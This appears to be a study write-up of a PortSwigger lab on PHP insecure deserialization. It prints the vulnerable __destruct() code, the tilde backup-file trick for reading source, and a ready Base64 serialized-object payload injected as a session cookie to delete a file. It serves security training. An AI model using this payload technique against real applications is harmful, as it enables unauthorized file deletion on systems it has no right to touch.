
# #PortSwigger 


![[Pasted image 20251221195121.png]]


## Lab Description

> This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.
> 
> - **Your credentials:** `wiener:peter`

---
---

## Step 1: Understanding the Vulnerability

**The arbitrary object injection flaw:**
- The application uses PHP serialization for session cookies
- The `CustomTemplate` class has a `__destruct()` magic method
- This method deletes the file at `lock_file_path` when the object is destroyed
- By injecting a `CustomTemplate` object with a malicious path, we can delete any file

**The attack:**
1. Obtain source code to understand the class structure
2. Create a serialized `CustomTemplate` object
3. Set `lock_file_path` to `/home/carlos/morale.txt`
4. Inject the serialized object as the session cookie
5. When the object is destroyed, `morale.txt` is deleted

---

## Step 2: Reconnaissance

### Step 2.1: Log In

1. Log in with `wiener:peter`
2. Go to **My account** page

### Step 2.2: Examine the Session Cookie

The session cookie contains a serialized PHP object:
```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjE5OiJ1c2Vycy93aWVuZXIvYXZhdGFyIjt9
```

Decoded:
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:19:"users/wiener/avatar";}
```

![[Pasted image 20251221195643.png]]


---

## Step 3: Obtaining Source Code

### Step 3.1: Discover the Source File

From the site map, find `/libs/CustomTemplate.php`.

![[Pasted image 20251221195951.png]]


![[Pasted image 20251221200105.png]]


### Step 3.2: Read the Source Code

Append a tilde (`~`) to access a backup file:
```
GET /libs/CustomTemplate.php~ HTTP/1.1
```

**Key finding:** The `__destruct()` method deletes the file at `lock_file_path`!


![[Pasted image 20251221200230.png]]



---

## Step 4: Understanding the Magic Method

### What is `__destruct()`?

In PHP, `__destruct()` is a magic method that is automatically called when an object is destroyed (end of script, object goes out of scope, or session ends).

**The vulnerable code:**
```
function __destruct()
{
    if (file_exists($this->lock_file_path)) {
        unlink($this->lock_file_path);  // Deletes the file!
    }
}
```

**Why this is dangerous:**
- The application unserializes user-supplied data
- It creates a `CustomTemplate` object from the session cookie
- When the script ends, `__destruct()` runs
- It deletes whatever file path is in `lock_file_path` (no validation!)

---

## Step 5: Crafting the Malicious Serialized Object

### Step 5.1: PHP Serialization Format

For a `CustomTemplate` object with one property `lock_file_path`:
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

### Step 5.2: Encode the Serialized Object

1. **Base64 encode** the serialized string
2. **URL encode** the Base64 string

**The encoded payload is:**
```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```

---

## Step 6: Injecting the Malicious Object

### Step 6.1: Replace the Session Cookie

In Burp Repeater, replace the `session` cookie value with your malicious payload:
```
GET /my-account?id=wiener HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```

### Step 6.2: Send the Request

Click **Send**

### Step 6.3: Observe the Result

**The response shows:**
```
Internal Server Error
PHP Fatal error: Uncaught Exception: Invalid user in /var/www/index.php:7
```

The error indicates that the application tried to process the object but the `__destruct()` method was still called - deleting the file before the error occurred.

---

## Step 7: Lab Solved

Success message displayed:

![[Pasted image 20251221200730.png]]

---
---


